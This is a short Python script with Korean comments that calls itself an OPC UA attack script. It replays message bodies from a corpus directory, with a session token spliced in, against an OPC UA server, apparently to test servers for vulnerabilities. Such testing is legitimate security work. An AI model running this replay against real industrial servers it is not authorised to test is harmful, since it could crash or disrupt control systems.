# OPC UA 메시지를 파일에서 읽어와 전송하는 공격 스크립트
#   이 스크립트는 주어진 파일로부터 OPC UA 메시지를 읽어와 서버로 전송합니다.
#
# CVEs:
#   - CVE 관련 내용은 없지만 파일 기반의 메시지 전송을 통해 서버 취약점을 분석하는 데 사용될 수 있습니다.

import datetime
import os

from protocol import *
from config import *

# 파일에서 메시지를 읽어 서버로 전송하는 함수
#   server_details: 서버 세부 정보 (프로토콜 타입, IP 주소, 포트 등)
#   file_path: 전송할 파일 경로
#   num_requests: 요청을 보낼 횟수
def send_message_from_file(server_details, file_path, num_requests=1):
    program_type, ip_addr, port, query_string = server_details

    opcua = OPCUA(program_type=program_type, ip_addr=ip_addr, port=port, query_string=query_string)
    opcua.session_timeout = 4 * 1000    # 짧은 세션 타임아웃 설정
    opcua.requested_lifetime = 4 * 1000 # 세션 요청 수명
    opcua.create_session()              # 세션 생성

    # 메시지 헤더 생성
    message_header = opcua.build_opcua_message_header()

    # 파일로부터 데이터 읽기
    with open(file_path, "rb") as f:
        file_data = f.read()

    # 메시지 바디 준비
    message_body = b""
    message_body += file_data[:4]        # Type ID, 요청 유형
    message_body += OBJECT.build(opcua.auth_id)  # 인증 토큰 추가
    message_body += file_data[6:]        # 나머지 데이터 추가
    message = message_header + message_body
    
    # 서버로 메시지 전송
    print("[-] Sending MSG Request - from file {} x {} times".format(file_path, num_requests))
    opcua.send_recv(message, num_requests, should_recv=False)
    time.sleep(0.01)

    # 연결 종료
    print("[-] Closing connection")
    try:
        opcua.close()
    except Exception as e:
        pass

# 여러 파일을 공격에 사용하는 함수
#   dir_corpus: 공격에 사용할 파일들이 있는 디렉터리 경로
def attack_dir(server_details, dir_corpus):
    # 디렉터리에서 파일 로드
    corpus_files = [os.path.join(dir_corpus, f) for f in os.listdir(dir_corpus) if os.path.isfile(os.path.join(dir_corpus, f))]
    for i, corp_path in enumerate(corpus_files):
        print("--------------------")
        print("[-] Corpus {} of {} total files".format(i, len(corpus_files)))
        print(corp_path)
        send_message_from_file(server_details, corp_path, num_requests=1)

# 단일 파일을 공격에 사용하는 함수
#   filepath_corpus: 공격에 사용할 파일 경로
#   num_requests: 요청을 보낼 횟수
def attack_file(server_details, filepath_corpus, num_requests=1):
    send_message_from_file(server_details, filepath_corpus, num_requests=num_requests)
